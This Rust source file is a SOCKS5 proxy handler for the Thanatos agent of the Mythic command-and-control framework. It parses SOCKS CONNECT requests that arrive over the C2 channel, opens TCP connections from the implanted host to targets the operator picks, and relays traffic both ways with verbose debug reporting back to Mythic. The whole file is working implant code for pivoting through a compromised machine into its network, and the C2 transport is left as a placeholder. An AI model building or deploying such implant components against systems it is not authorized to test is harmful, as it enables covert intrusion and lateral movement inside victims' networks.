// Final SOCKS5 Agent-Side Handler for Mythic in Rust (Integrated for Thanatos)
use base64::{decode, encode};
use serde::Deserialize;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::mpsc as std_mpsc;
use std::sync::{Arc, Mutex};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc as tokio_mpsc, Mutex as AsyncMutex};
use tokio::time::{timeout, Duration};
use tokio_util::sync::CancellationToken;
use once_cell::sync::Lazy;

#[derive(Deserialize)]
struct AgentTask {
    id: String,
    #[serde(default)]
    command: Option<String>,
    #[serde(default)]
    parameters: Option<String>,
}

// -------- Global state (channels + cancel token) --------

struct SocksIn {
    tx: tokio_mpsc::UnboundedSender<Value>,
    rx: AsyncMutex<tokio_mpsc::UnboundedReceiver<Value>>,
}

static SOCKS_IN: Lazy<SocksIn> = Lazy::new(|| {
    let (tx, rx) = tokio_mpsc::unbounded_channel::<Value>();
    SocksIn { tx, rx: AsyncMutex::new(rx) }
});

// Backward-compatible alias so existing code that uses SOCKS_IN_TX.send(...) still works.
static SOCKS_IN_TX: Lazy<tokio_mpsc::UnboundedSender<Value>> = Lazy::new(|| SOCKS_IN.tx.clone());

static SOCKS_OUT: Lazy<Arc<Mutex<Vec<Value>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));

// Re-usable cancellation: store current token if running, replace it on "start", cancel on "stop".
static SOCKS_CANCEL: Lazy<AsyncMutex<Option<CancellationToken>>> =
    Lazy::new(|| AsyncMutex::new(None));

// Optional helper for callers to enqueue inbound items
#[inline]
pub fn socks_in_send(v: Value) -> Result<(), tokio_mpsc::error::SendError<Value>> {
    SOCKS_IN.tx.send(v)
}

/* -------------------------- Debug helpers -------------------------- */

// Wire this to your C2 transport for Mythic responses.
async fn post_response(task_id: &str, response: Value) -> Result<(), Box<dyn Error>> {
    // Example placeholder; replace with your agent's send routine.
    println!("POST_RESPONSE {}: {}", task_id, response);
    Ok(())
}

async fn debug_to_mythic(task_id: &str, title: impl Into<String>, detail: impl Into<String>) {
    let _ = post_response(
        task_id,
        json!({ "user_output": format!("{}: {}", title.into(), detail.into()) })
    ).await;
}

fn hex_preview(data: &[u8], max: usize) -> String {
    use std::fmt::Write;
    let mut s = String::new();
    let take = data.len().min(max);
    for b in &data[..take] {
        let _ = write!(&mut s, "{:02x}", b);
    }
    if data.len() > max {
        s.push('…');
    }
    s
}

/* ------------------------------- SOCKS utils ------------------------------ */

fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
    let mut out = vec![0x05, rep, 0x00];
    match bound {
        Some(SocketAddr::V4(v4)) => {
            out.push(0x01);
            out.extend_from_slice(&v4.ip().octets());
            out.extend_from_slice(&v4.port().to_be_bytes());
        }
        Some(SocketAddr::V6(v6)) => {
            out.push(0x04);
            out.extend_from_slice(&v6.ip().octets());
            out.extend_from_slice(&v6.port().to_be_bytes());
        }
        None => {
            out.push(0x01);
            out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
            out.extend_from_slice(&0u16.to_be_bytes());
        }
    }
    out
}

fn send_socks_live(server_id: &str, data: &[u8], exit: bool) -> Result<(), Box<dyn Error>> {
    let sid_json = match server_id.parse::<u64>() {
        Ok(n) => json!(n),
        Err(_) => json!(server_id),
    };
    let item = json!({
        "server_id": sid_json,
        "data": encode(data),
        "exit": exit
    });
    // If the mutex is poisoned, salvage the inner Vec to avoid data loss
    let mut out = SOCKS_OUT.lock().unwrap_or_else(|p| p.into_inner());
    out.push(item);
    Ok(())
}

fn send_exit_live(server_id: &str) {
    let _ = send_socks_live(server_id, &[], true);
}

/* --------------------------- CONNECT frame parsing ------------------------- */

fn parse_connect(decoded: &[u8]) -> Result<(String, u16, u8), Box<dyn Error>> {
    if decoded.len() < 4 { return Err("SOCKS5 request too short".into()); }
    if decoded[0] != 0x05 { return Err("Unsupported SOCKS version".into()); }
    if decoded[1] != 0x01 { return Err("Not CONNECT (CMD!=0x01)".into()); }
    if decoded[2] != 0x00 { return Err("RSV must be 0x00".into()); }

    let atyp = decoded[3];
    match atyp {
        0x01 => {
            if decoded.len() < 10 { return Err("IPv4 CONNECT frame too short".into()); }
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            Ok((ip.to_string(), port, atyp))
        }
        0x03 => {
            if decoded.len() < 5 { return Err("DOMAIN CONNECT no length".into()); }
            let len = decoded[4] as usize;
            if len == 0 || len > 255 { return Err("Bad domain length".into()); }
            let need = 5 + len + 2;
            if decoded.len() < need { return Err("DOMAIN CONNECT truncated".into()); }
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([decoded[5 + len], decoded[5 + len + 1]]);
            Ok((domain, port, atyp))
        }
        0x04 => {
            if decoded.len() < 22 { return Err("IPv6 CONNECT frame too short".into()); }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&decoded[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([decoded[20], decoded[21]]);
            Ok((ip.to_string(), port, atyp))
        }
        _ => Err("Unsupported ATYP in CONNECT".into()),
    }
}

/* ------------------------- Helpers for inbound frames ---------------------- */

fn as_string_or_number(v: &Value) -> Option<String> {
    if let Some(s) = v.as_str() { return Some(s.to_string()); }
    if let Some(n) = v.as_u64() { return Some(n.to_string()); }
    if let Some(n) = v.as_i64() { return Some(n.to_string()); }
    None
}

/* ------------------------ Greeting detection (optional) -------------------- */

fn looks_like_greeting(buf: &[u8]) -> bool {
    if buf.len() < 2 { return false; }
    if buf[0] != 0x05 { return false; }
    let n = buf[1] as usize;
    buf.len() >= 2 + n && buf.len() < 2 + n + 4
}

/* ------------------------------ Session logic ----------------------------- */

async fn run_session(
    parent_task_id: String,
    server_id: String,
    mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
) -> Result<(), Box<dyn Error>> {
    debug_to_mythic(&parent_task_id, "socks.session.start", format!("sid={}", server_id)).await;

    // Get first frame
    let first = match sess_rx.recv().await {
        Some(v) => v,
        None => {
            debug_to_mythic(&parent_task_id, "socks.session.abort", "no-initial-packet").await;
            return Ok(());
        }
    };

    let b64 = first["data"].as_str().unwrap_or("");
    let mut buf = match decode(b64) {
        Ok(d) => d,
        Err(e) => {
            debug_to_mythic(&parent_task_id, "socks.decode.fail", format!("err={}", e)).await;
            send_socks_live(&server_id, &build_reply(0x01, None), true)?;
            return Ok(());
        }
    };

    debug_to_mythic(
        &parent_task_id,
        "socks.first",
        format!("len={}; hex={}", buf.len(), hex_preview(&buf, 64))
    ).await;

    // Handle optional greeting
    if looks_like_greeting(&buf) {
        let sel = [0x05u8, 0x00u8]; // VER=5, METHOD=0 (no auth)
        send_socks_live(&server_id, &sel, false)?;
        debug_to_mythic(&parent_task_id, "socks.greeting.seen", "replied 05 00").await;

        // Wait for CONNECT
        let nxt = match sess_rx.recv().await {
            Some(v) => v,
            None => {
                debug_to_mythic(&parent_task_id, "socks.session.abort", "no CONNECT after greeting").await;
                return Ok(());
            }
        };
        let b64 = nxt["data"].as_str().unwrap_or("");
        buf = match decode(b64) {
            Ok(d) => d,
            Err(e) => {
                debug_to_mythic(&parent_task_id, "socks.decode.fail2", format!("err={}", e)).await;
                send_socks_live(&server_id, &build_reply(0x01, None), true)?;
                return Ok(());
            }
        };
        debug_to_mythic(
            &parent_task_id,
            "socks.connect.req.after_greet",
            format!("len={}; hex={}", buf.len(), hex_preview(&buf, 64))
        ).await;
    }

    // Parse CONNECT
    let (addr, port, _atyp) = match parse_connect(&buf) {
        Ok(v) => v,
        Err(e) => {
            let rep = if e.to_string().contains("ATYP") { 0x08 } else { 0x07 };
            debug_to_mythic(&parent_task_id, "socks.connect.parse_err", format!("err={}", e)).await;
            send_socks_live(&server_id, &build_reply(rep, None), true)?;
            return Ok(());
        }
    };

    debug_to_mythic(&parent_task_id, "socks.connect.try", format!("target={}:{}", addr, port)).await;

    // Connect to destination
    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            let e_lc = e.to_string().to_lowercase();
            let rep = if e_lc.contains("refused") { 0x05 }
                      else if e_lc.contains("unreachable") { 0x03 }
                      else if e_lc.contains("unsupported") { 0x08 }
                      else { 0x01 };
            debug_to_mythic(&parent_task_id, "socks.connect.err", format!("rep=0x{:02x}; err={}", rep, e)).await;
            send_socks_live(&server_id, &build_reply(rep, None), true)?;
            return Ok(());
        }
        Err(_) => {
            debug_to_mythic(&parent_task_id, "socks.connect.timeout", "15s exceeded").await;
            send_socks_live(&server_id, &build_reply(0x01, None), true)?;
            return Ok(());
        }
    };

    let local_addr = remote.local_addr().ok();
    let ok_reply = build_reply(0x00, local_addr);
    send_socks_live(&server_id, &ok_reply, false)?;
    debug_to_mythic(
        &parent_task_id,
        "socks.connect.ok",
        format!("bound={:?}; reply_hex={}", local_addr, hex_preview(&ok_reply, 22))
    ).await;

    let (mut r_r, mut r_w) = remote.into_split();

    // A2M: Agent -> Mythic (read from remote and send up)
    let sid_up = server_id.clone();
    let parent_up = parent_task_id.clone();
    let a2m = tokio::spawn(async move {
        let mut buf = vec![0u8; 16 * 1024];
        let mut total: u64 = 0;
        loop {
            let result = timeout(Duration::from_secs(300), r_r.read(&mut buf)).await;
            match result {
                Ok(Ok(0)) => {
                    debug_to_mythic(&parent_up, "socks.a2m.eof", format!("total={}", total)).await;
                    send_exit_live(&sid_up);
                    break;
                }
                Ok(Ok(n)) => {
                    if n > 0 {
                        total += n as u64;
                        let _ = send_socks_live(&sid_up, &buf[..n], false);
                        if total % (64 * 1024) == 0 {
                            debug_to_mythic(&parent_up, "socks.a2m.progress", format!("sent_up={}", total)).await;
                        }
                    }
                }
                Ok(Err(e)) => {
                    debug_to_mythic(&parent_up, "socks.a2m.read_err", format!("err={}", e)).await;
                    send_exit_live(&sid_up);
                    break;
                }
                Err(_) => {
                    debug_to_mythic(&parent_up, "socks.a2m.idle_timeout", format!("sent_up={}", total)).await;
                    send_exit_live(&sid_up);
                    break;
                }
            }
        }
    });

    // M2A: Mythic -> Agent (recv from Mythic and write to remote)
    let parent_dn = parent_task_id.clone();
    let m2a = tokio::spawn(async move {
        let mut total: u64 = 0;
        while let Some(pkt) = sess_rx.recv().await {
            let exit = pkt.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
            if exit {
                debug_to_mythic(&parent_dn, "socks.m2a.exit", format!("total_written={}", total)).await;
                let _ = r_w.shutdown().await;
                break;
            }
            let data_b64 = pkt.get("data").and_then(|v| v.as_str()).unwrap_or("");
            if data_b64.is_empty() {
                continue;
            }
            debug_to_mythic(&parent_dn, "socks.m2a.data_received", format!("b64_len={}", data_b64.len())).await;
            let bytes = match decode(data_b64) {
                Ok(b) => b,
                Err(e) => {
                    debug_to_mythic(&parent_dn, "socks.m2a.b64_err", format!("err={}", e)).await;
                    continue;
                }
            };
            if !bytes.is_empty() {
                debug_to_mythic(&parent_dn, "socks.m2a.bytes_to_write", format!("len={}; hex={}", bytes.len(), hex_preview(&bytes, 32))).await;
                total += bytes.len() as u64;
                let write_result = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await;
                if let Err(e) = write_result {
                    debug_to_mythic(&parent_dn, "socks.m2a.write_err", format!("err={}", e)).await;
                    break;
                }
                if total % (64 * 1024) == 0 {
                    debug_to_mythic(&parent_dn, "socks.m2a.progress", format!("wrote_down={}", total)).await;
                }
            }
        }
        let _ = r_w.shutdown().await;
        debug_to_mythic(&parent_dn, "socks.m2a.end", format!("total_written={}", total)).await;
    });

    let _ = a2m.await;
    let _ = m2a.await;

    debug_to_mythic(&parent_task_id, "socks.session.end", format!("sid={}", server_id)).await;
    Ok(())
}

/* --------------------------------- Dispatcher ----------------------------- */

pub async fn start_socks_dispatcher(task_id: String, cancel: CancellationToken) {
    let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
    let mut seen: u64 = 0;

    debug_to_mythic(&task_id, "socks.dispatcher.run", "awaiting items").await;

    // This task owns the receiver while it runs.
    let mut rx_guard = SOCKS_IN.rx.lock().await;

    loop {
        tokio::select! {
            maybe = rx_guard.recv() => {
                let Some(item) = maybe else {
                    debug_to_mythic(&task_id, "socks.dispatcher.rx_closed", "channel closed").await;
                    break;
                };

                seen += 1;
                let sid = item.get("server_id")
                    .and_then(as_string_or_number)
                    .unwrap_or_default();

                let exit = item.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
                let data_len_b64 = item.get("data").and_then(|v| v.as_str()).map(|s| s.len()).unwrap_or(0);

                if seen <= 5 || seen % 100 == 0 {
                    debug_to_mythic(&task_id, "socks.dispatcher.item",
                        format!("count={}; sid={}; exit={}; data_b64_len={}", seen, sid, exit, data_len_b64)).await;
                }

                let entry = sessions.entry(sid.clone()).or_insert_with(|| {
                    let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel::<Value>();
                    let task_clone = task_id.clone();
                    let sid_clone = sid.clone();
                    tokio::spawn(async move {
                        let _ = run_session(task_clone, sid_clone, sess_rx).await;
                    });
                    sess_tx
                });

                if entry.send(item).is_err() {
                    sessions.remove(&sid);
                    debug_to_mythic(&task_id, "socks.dispatcher.drop_dead", format!("sid={}", sid)).await;
                }

                if exit {
                    sessions.remove(&sid);
                    debug_to_mythic(&task_id, "socks.dispatcher.exit", format!("sid={}", sid)).await;
                }
            }
            _ = cancel.cancelled() => {
                debug_to_mythic(&task_id, "socks.dispatcher.cancelled", "Shutting down").await;
                break;
            }
        }
    }

    debug_to_mythic(&task_id, "socks.dispatcher.end", "bridge closed").await;
    sessions.clear();
}

/* --------------------------------- Entry ---------------------------------- */

pub async fn handle_socks(
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    // First message should be the AgentTask envelope (blocking)
    let task_val = rx.recv()?;
    let task: AgentTask = serde_json::from_value(task_val)?;

    // Parse parameters (JSON string)
    let params: Value = if let Some(p) = task.parameters {
        serde_json::from_str(&p)?
    } else {
        return Err("No parameters in task".into());
    };
    let action = params.get("action").and_then(|v| v.as_str()).unwrap_or("start");

    debug_to_mythic(&task.id, "socks.handler", format!("action={}", action)).await;

    if action == "stop" {
        let mut g = SOCKS_CANCEL.lock().await;
        if let Some(tok) = g.take() {
            tok.cancel();
        }
        debug_to_mythic(&task.id, "socks.handler.stop", "Dispatcher cancelled").await;
        return Ok(());
    }

    // Start the dispatcher for "start" with a fresh token
    let cancel = CancellationToken::new();
    {
        let mut g = SOCKS_CANCEL.lock().await;
        *g = Some(cancel.clone());
    }
    start_socks_dispatcher(task.id, cancel).await;

    Ok(())
}

pub fn setup_socks(
    _tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    // Create a runtime for the socks handler
    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(handle_socks(rx))
}
